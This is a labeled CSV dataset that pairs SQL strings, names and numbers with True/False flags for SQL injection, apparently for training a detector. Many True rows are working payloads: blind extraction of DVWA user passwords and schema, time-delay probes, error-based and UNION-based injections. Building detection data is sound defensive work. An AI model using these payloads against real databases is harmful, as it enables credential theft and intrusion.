Query,SQLIA
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>112 AND 'yIOe'='yIOe",True
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",True
SELECT * FROM applied WHERE light NOT LIKE '[slowly]%',False
SELECT * FROM simply ORDER BY desk DESC,False
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",True
SELECT * FROM add WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',False
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",True
SELECT * FROM Customers  WHERE CustomerName LIKE '_r%';,False
SELECT * FROM fact WHERE brown BETWEEN '1996-07-01' AND '1996-07-31',False
"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",True
"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",True
9.51518E+15,False
"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",True
SELECT tired ( s )  FROM barn UNION ALL,False
"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",True
81,False
"  SELECT MOD ( 18, 4 ) ;",False
uriz carmona,False
47400,False
SELECT * FROM shelter,False
"  SELECT TIMEDIFF ( ""2017-06-25 13:10:11"", ""2017-06-15 13:10:10"" ) ;",False
"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'odkr'  =  'odkr",True
sangres,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>52 AND 'JUqW'='JUqW",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),3,1))>98 AND 'DPoM'='DPoM",True
SELECT slide ( s )  FROM would UNION,False
"SELECT LPAD ( ""SQL Tutorial"",   20, ""ABC"" ) ;",False
78595518x,False
1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',True
-9840'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dzlp'  =  'dzlp,True
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""whld""  =  ""whld",True
1  )   where 2232  =  2232,True
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'plfa'  =  'plfa",True
"SELECT DATE_ADD ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",False
refrigerativo,False
"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",True
"  SELECT add,putting,frame FROM clean LEFT JOIN Orders ON recently.courseID =  cage.thirty ORDER BY planet.though",False
7542,False
"  SELECT forgot,becoming,health FROM bag LEFT JOIN Orders ON island.experienceID =  cast.keep ORDER BY dream.reach",False
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",True
""" or """"&""",True
DELETE FROM silence,False
"1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",True
"1  )   as rbmn where 5948  =  5948 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",True
SELECT Count ( * )  AS ourselves,False
"  SELECT world AS hide, youth AS [flat]  FROM brave",False
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",True
"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",True
1'   )    )    as yqek where 1957  =  1957,True
SELECT * FROM citizen,False
"SELECT DAYOFWEEK ( ""2017-06-15 09:34:21"" ) ;",False
"-4945 or make_set  (  9354  =  9354,7185  )  ",True
3xp2n18va,False
-5113'   )    )     )   or 7200  =  3094--,True
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",True
tanglao,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),15,1))>56 AND 'upay'='upay",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),18,1))>60 AND 'JUqW'='JUqW",True
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",True
SELECT storm ( s )  FROM might UNION ALL,False
esbarar,False
"  SELECT machinery,add FROM army WHERE wife = 'brown' UNION SELECT information, ready FROM one",False
 UPDATE basic SET proper = 'bag'WHERE high = 'did',False
SELECT * FROM story WHERE table BETWEEN '1996-07-01' AND '1996-07-31',False
6.39488E+14,False
48483117z,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),3,1))>99 AND 'CRxB'='CRxB",True
42855301e,False
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  '%'  =  ',True
SELECT * FROM lift WHERE football = 'strong'  OR threw = 'depend',False
SELECT * FROM dirty WHERE whole = 'stood' FETCH FIRST 3 ROWS ONLY,False
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykxz'  =  'ykxz",True
SELECT * FROM CustomersWHERE Country = 'Germany'LIMIT 3;,False
SELECT * FROM length WHERE flow = 'review' FETCH FIRST 3 ROWS ONLY,False
"  SELECT * FROM hang WHERE fifteen NOT IN  ( 'three', 'speech', 'furniture' )  ",False
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND  ( wp_posts.ID  =  '181' )  AND wp_posts.post_type  =  'page' ORDER BY wp_posts.post_date DESC,False
"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>97 AND 'Tfyt'='Tfyt",True
"-5235  )   or make_set  (  9354  =  9354,7185  )  ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),2,1))>97 AND 'ESxF'='ESxF",True
SELECT AVG ( successful ) FROM ride,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>100 AND 'hBNb'='hBNb",True
SELECT AVG ( ear ) FROM school SELECT SUM ( heat ) ,False
a0_idia,False
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',True
SELECT * FROM forget WHERE mine IN  ( SELECT bee FROM spread ) ,False
"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",True
SELECT edge,False
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ) ,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(first_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),5,1))>112 AND 'gHrb'='gHrb",True
"-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--",True
torgo,False
"  SELECT * FROM trade WHERE rule IN  ( 'club', 'milk', 'care' )  ",False
SELECT * FROM water WHERE author LIKE '%pour%',False
saunder,False
SELECT * FROM fun WHERE due BETWEEN '1996-07-01' AND '1996-07-31',False
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 191 )  ORDER BY meta_id ASC",False
SELECT * FROM cage WHERE carbon LIKE '%pen%',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),1,1))>32 AND 'bSNt'='bSNt",True
SELECT AVG ( basket ) FROM problem,False
13630,False
"  SELECT Orders.knownrID, Employees.whale, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settlersID ORDER BY Orders.houseID",False
SELECT lion ( s )  FROM list UNION,False
SELECT AVG ( production ) FROM list SELECT SUM ( wooden ) ,False
SELECT * FROM strip,False
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28555 )  ORDER BY meta_id ASC",False
3.15402E+15,False
1  )   waitfor delay '0:0:5' and   (  2993  =  2993,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),5,1))>24 AND 'znpp'='znpp",True
"1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",True
bili,False
SELECT * FROM sit WHERE    NOT am = 'start',False
SELECT * FROM pile 3 SELECT * FROM studied,False
SELECT * FROM job WHERE soap = 'what'  AND City = 'chose',False
SELECT * FROM foreign WHERE Price NOT BETWEEN 10 AND 20,False
"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",True
"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",True
1 union all select null#,True
boes@cumbareback.kz,False
canella,False
SELECT MIN ( customs )  AS telephone FROM zipper,False
SELECT TOP 3 * FROM same,False
"-3637"" or   (  8459  =  8459  )  *4906",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),4,1))>88 AND 'stCx'='stCx",True
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""jyad""  =  ""jyad",True
"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_name AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),6,1))>48 AND 'OqWN'='OqWN",True
"1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",True
18410,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),8,1))>35 AND 'uBuU'='uBuU",True
lakshmin,False
"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",True
"1,  (  case when 6620  =  3092 then 1 else null end  )  ",True
"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",True
SELECT face FROM captured UNION SELECT environment FROM night ORDER BY frequently,False
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82c5dbb23' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",False
--,True
1  )   as qort where 1554  =  1554,True
select sleep  (  5  )   and 'hhrw' like 'hhrw,True
1  )   and 7533  =  7533 and   (  7175  =  7175,True
SELECT * FROM post FETCH FIRST 50 PERCENT ROWS ONLY,False
"1'   )    )    union all select null,null,null,null,null,null,null#",True
"INSERT INTO prove ( hand, remain, teacher, chance, getting, experience )  VALUES  ( 'regular', 'extra'. obtain', 'beyond', 'mirror', 'zoo', 'search' )  ",False
34120,False
febrer pedrouzo,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),13,1))>54 AND 'bSNt'='bSNt",True
9.55464E+15,False
1'  )   where 4949  =  4949,True
SELECT * FROM born 3,False
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239186 )  ORDER BY meta_id ASC",False
SELECT * FROM typical,False
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'jfwt' like 'jfwt",True
"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",True
"1"" and make_set  (  6520  =  9958,9958  )  ",True
brenna,False
cerinza,False
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_settings' LIMIT 1,False
47172,False
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,True
chmara@novolardiseno.ky,False
"1%'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",True
"-8684 union all select 9519,9519,9519,9519--",True
franklin,False
"linares, 42",False
"select sleep  (  5  )   and   (  ""innk""  =  ""innk",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 6,1),2,1))>104 AND 'zFnD'='zFnD",True
95868852e,False
34170,False
rolleck@soybueno.mm,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x64767761 LIMIT 1,1),2,1))>112 AND 'fdLM'='fdLM",True
1' ORDER BY 1#,True
"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",True
SELECT * FROM ran,False
SELECT * FROM upper WHERE mainly BETWEEN 'these' AND 'clay',False
92793320g,False
SELECT drop,False
8.02525E+15,False
ajona valenzuela,False
novelador,False
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe",True
SELECT * FROM practice WHERE twenty BETWEEN '1996-07-01' AND '1996-07-31',False
tormellas,False
SELECT * FROM Products WHERE Price BETWEEN 10 AND 20;,False
SELECT * FROM ate WHERE Price NOT BETWEEN 10 AND 20,False
"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",True
"-8703'  )   where 9723  =  9723 union all select 9723,9723,9723,9723,9723#",True
-7345  )   union all select 3866#,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),17,1))>100 AND 'Tfyt'='Tfyt",True
tapies ximenis,False
roberto,False
50212,False
"calle membezar 0, 2?c",False
SELECT AVG ( Price ) FROM income,False
"1  )   where 4226  =  4226 or elt  (  5873  =  5873,sleep  (  5   )    )   #",True
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",True
"-8734%""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,True
"  SELECT milkID AS ID, at AS spin FROM object",False
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,True
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',False
thirugna,False
1%'   )    )     )   and 3916  =  6327--,True
5.20367E+15,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),18,1))>49 AND 'uBuU'='uBuU",True
zanquita,False
SELECT eleven ( s FROM nothing RIGHT JOIN,False
SELECT * FROM master WHERE at = 'baseball',False
"  SELECT * FROM enter WHERE actually IN  ( 'chance', 'teacher', 'beauty' )  ",False
milly7,False
"-4286%""   )    )     )   union all select 2229,2229,2229,2229,2229,2229#",True
SELECT * FROM down 3 SELECT * FROM applied,False
7.84149E+15,False
SELECT TOP 50 PERCENT * FROM product SELECT * FROM lack FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circus,False
"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",True
15124,False
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),5,1))>51 AND 'JUqW'='JUqW",True
"   SELECT COUNT ( hold ) , near FROM influence BY ground",False
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",True
-1190' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'yxry' like 'yxry,True
SELECT * FROM tail WHERE herd = 'sun'  AND  ( film = 'entirely' OR become = 'sport' ) ,False
"iif  (  5257  =  5257,1,1/0  )  ",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>49 AND 'yuzR'='yuzR",True
"SELECT LOCATE ( ""3"", ""W3Schools.com"" )  AS MatchPosition;",False
" select * from users where id  =  1 or 1#"", union select 1,version  (    )   -- 1",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),16,1))>98 AND 'uEgY'='uEgY",True
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",True
SELECT * FROM were WHERE cloth IN  ( SELECT balloon FROM minerals ) ,False
halliwil,False
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,True
SELECT TOP 3 * FROM Customers;  SELECT * FROM CustomersLIMIT 3;SELECT * FROM Customers,False
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),16,1))>54 AND 'upay'='upay",True
combee,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),5,1))>96 AND 'TkwJ'='TkwJ",True
pi,False
prueckner@helicopter.com.gf,False
